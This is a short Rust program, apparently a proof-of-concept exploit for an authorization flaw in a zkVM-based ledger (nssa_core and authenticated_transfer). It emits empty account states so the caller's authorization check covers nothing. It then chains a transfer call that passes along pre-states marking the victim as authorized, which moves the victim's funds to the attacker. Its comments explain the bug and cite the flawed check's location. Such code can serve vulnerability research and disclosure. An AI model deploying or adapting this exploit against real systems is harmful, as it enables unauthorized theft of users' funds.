use nssa_core::program::{ChainedCall, ProgramId, ProgramInput, ProgramOutput, read_nssa_inputs};

/// Instruction: (`auth_transfer_id`, `amount`) — both primitive, safe for `risc0_zkvm::serde`.
type Instruction = (ProgramId, u128);

fn main() {
    let (
        ProgramInput {
            self_program_id,
            caller_program_id,
            pre_states,
            instruction: (auth_transfer_id, amount),
        },
        instruction_words,
    ) = read_nssa_inputs::<Instruction>();

    // Output empty pre/post states. P2 processes no accounts itself, so the
    // authorization check at validated_state_diff.rs:158-182 runs over nothing.
    // Victim is never compared against caller_data.authorized_accounts = {attacker}.
    //
    // The bug: authorized_accounts for authenticated_transfer is built from
    // chained_call.pre_states (this call's inputs, set by P1), which contains
    // victim(is_authorized=true). So authorized_accounts = {victim}, and the
    // subsequent check passes.
    let auth_transfer_instruction =
        risc0_zkvm::serde::to_vec(&authenticated_transfer_core::Instruction::Transfer { amount })
            .expect("serialization is infallible");

    ProgramOutput::new(
        self_program_id,
        caller_program_id,
        instruction_words,
        vec![],
        vec![],
    )
    .with_chained_calls(vec![ChainedCall {
        program_id: auth_transfer_id,
        pre_states,
        instruction_data: auth_transfer_instruction,
        pda_seeds: vec![],
    }])
    .write();
}
